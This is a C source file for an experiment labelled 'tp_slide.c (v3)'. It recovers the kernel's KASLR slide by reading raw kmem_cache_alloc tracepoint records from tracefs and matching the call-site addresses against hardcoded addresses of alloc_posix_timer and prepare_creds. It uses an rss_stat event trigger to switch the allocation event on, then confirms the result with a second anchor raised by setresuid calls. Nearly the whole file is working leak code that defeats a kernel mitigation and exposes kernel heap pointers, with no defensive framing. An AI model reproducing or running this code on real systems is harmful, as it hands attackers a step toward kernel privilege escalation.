/*
 * tp_slide.c (v3) - experiment B: KASLR slide from the static
 * kmem_cache_alloc tracepoint, without kprobes and without perf.
 *
 * Records are read raw from /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw.
 * For kmem_cache_alloc, relative to call_site: site +0, ptr +8, bytes_req +24.
 *
 *   TIMER_LINK = 0xffffffc0803a726c (alloc_posix_timer, bytes_req 0x180)
 *   CRED_LINK  = 0xffffffc08026d1b4 (prepare_creds,     bytes_req 0xb8)
 *
 * The event is enabled once, three samples are taken, then the independent
 * cred anchor is required to reproduce the same slide.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define ENFILE TRACE "/events/kmem/kmem_cache_alloc/enable"

static const unsigned long long TIMER_LINK = 0xffffffc0803a726cULL;
static const unsigned long long CRED_LINK  = 0xffffffc08026d1b4ULL;
static const unsigned long long ALIGN_MASK  = 0x1fffffULL;

static int wf(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0) return -errno;
	ssize_t n = write(fd, s, strlen(s));
	int e = errno;
	close(fd);
	return n < 0 ? -e : 0;
}

static int trigger(const char *s)
{
	int r = wf(TRIGGER, s);
	if (r == 0 || r == -EEXIST) return 0;
	return r;
}

static int enable_state(void)
{
	char b[8] = {0};
	int fd = open(ENFILE, O_RDONLY | O_CLOEXEC);
	if (fd < 0) return -1;
	int n = (int)read(fd, b, sizeof b - 1);
	close(fd);
	if (n <= 0) return -1;
	return b[0] == '1';
}

static int kick_rss(void)
{
	unsigned char *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (wf(TRACE "/events/kmem/rss_stat/enable", "1\n")) return -1;
	if (p != MAP_FAILED) { ((volatile unsigned char *)p)[0] = 1; munmap(p, 4096); }
	wf(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static int trace_off_on(void)
{
	int fd;
	if (wf(TRACE "/tracing_on", "0\n")) return -1;
	fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
	if (fd < 0) return -1;
	close(fd);
	if (wf(TRACE "/tracing_on", "1\n")) return -1;
	return 0;
}

static int read_raw(unsigned char *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget = 200;
	*used = 0;
	if (fd < 0) return -errno;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) { *used += (size_t)n; budget = 200; continue; }
		if (n == 0) break;
		if (errno != EAGAIN && errno != EINTR) { close(fd); return -1; }
		usleep(1000);
	}
	close(fd);
	return 0;
}

struct hit { unsigned long long site, ptr, slide; };

static int scan(unsigned char *buf, size_t used, unsigned long req,
		unsigned long long link, struct hit *out, int max)
{
	int n = 0;
	for (size_t i = 0; i + 32 <= used; i++) {
		unsigned long long site, ptr, br;
		memcpy(&site, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&br, buf + i + 24, 8);
		if (br != req) continue;
		if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff) continue;
		if (n < max) {
			out[n].site = site;
			out[n].ptr = ptr;
			out[n].slide = site - link;
			n++;
		}
	}
	return n;
}

static unsigned long long sample_timer(unsigned char *buf, size_t cap)
{
	size_t used = 0;
	unsigned long long slide = 0;
	struct sigevent ev;
	timer_t id;
	memset(&ev, 0, sizeof ev);
	ev.sigev_notify = SIGEV_NONE;
	if (trace_off_on()) { printf("TRACE_ON_FAIL\n"); return 0; }
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0) timer_delete(id);
	else printf("TIMER_FAIL errno=%d\n", errno);
	wf(TRACE "/tracing_on", "0\n");
	if (read_raw(buf, cap, &used)) { printf("READ_FAIL\n"); return 0; }
	struct hit h[64];
	int n = scan(buf, used, 0x180, TIMER_LINK, h, 64);
	for (int i = 0; i < n; i++) {
		if (h[i].slide > 0 && h[i].slide < 0x10000000000ULL &&
		    (h[i].slide & ALIGN_MASK) == 0) {
			slide = h[i].slide;
			printf("SAMPLE raw=%zu site=0x%llx ptr=0x%llx slide=0x%llx\n",
			       used, h[i].site, h[i].ptr, h[i].slide);
			break;
		}
		printf("SAMPLE-UNALIGNED raw=%zu site=0x%llx slide=0x%llx\n",
		       used, h[i].site, h[i].slide);
	}
	if (!n) printf("SAMPLE-EMPTY raw=%zu\n", used);
	return slide;
}

int main(void)
{
	cpu_set_t set;
	unsigned long long cand[3] = {0, 0, 0};
	int n = 0, best = 0, bestc = 0;
	char bootid[64] = "?";
	int bf;
	unsigned char *buf = malloc(8 << 20);
	size_t used = 0;

	if (!buf) return 1;
	CPU_ZERO(&set); CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof set, &set))
		printf("PIN_FAIL errno=%d\n", errno);

	bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	if (bf >= 0) {
		int r = (int)read(bf, bootid, sizeof bootid - 1);
		if (r > 0) { while (r > 0 && (bootid[r-1] == '\n' || bootid[r-1] == '\r')) r--; bootid[r] = 0; }
		close(bf);
	}
	printf("BOOTID %s\n", bootid);
	printf("ENABLE before=%d\n", enable_state());
	trigger("!enable_event:kmem:kmem_cache_alloc\n");
	trigger("enable_event:kmem:kmem_cache_alloc\n");
	if (trigger("enable_event:kmem:kmem_cache_alloc\n"))
		printf("TRIGGER_ENABLE_FAIL\n");
	kick_rss();
	printf("ENABLE after=%d\n", enable_state());

	for (int i = 0; i < 3; i++) {
		unsigned long long s = sample_timer(buf, 8 << 20);
		if (!s) { printf("CAND %d empty\n", i); continue; }
		printf("CAND %d 0x%llx\n", i, s);
		cand[n++] = s;
		if (n >= 2 && cand[0] == cand[1]) break;
	}
	if (!n) { printf("REFUSE none\n"); goto out; }
	for (int i = 0; i < n; i++) {
		int c = 0;
		for (int j = 0; j < n; j++) if (cand[j] == cand[i]) c++;
		if (c > bestc) { bestc = c; best = i; }
	}
	if (n >= 2 && bestc < 2) { printf("REFUSE unstable\n"); goto out; }
	printf("SLIDE 0x%llx samples=%d\n", cand[best], n);

	/* independent anchor: prepare_creds record must carry the same slide */
	if (trace_off_on()) { printf("TRACE_ON_FAIL2\n"); goto out; }
	{
		struct sigevent ev;
		(void)ev;
	}
	syscall(SYS_setresuid, 2000u, 2000u, 2000u);
	syscall(SYS_setfsuid, 2000u);
	wf(TRACE "/tracing_on", "0\n");
	if (read_raw(buf, 8 << 20, &used) == 0) {
		struct hit h[64];
		int m = scan(buf, used, 0xb8, CRED_LINK, h, 64), match = 0;
		for (int i = 0; i < m; i++) {
			int ok = h[i].site == CRED_LINK + cand[best];
			match += ok;
			printf("CREDSITE 0x%llx ptr=0x%llx match=%d\n", h[i].site, h[i].ptr, ok);
		}
		printf("CRED_ANCHOR seen=%d match=%d\n", m, match);
	} else printf("CRED_READ_FAIL\n");

out:
	trigger("!enable_event:kmem:kmem_cache_alloc\n");
	trigger("disable_event:kmem:kmem_cache_alloc\n");
	wf(TRACE "/tracing_on", "0\n");
	free(buf);
	printf("DONE\n");
	return 0;
}
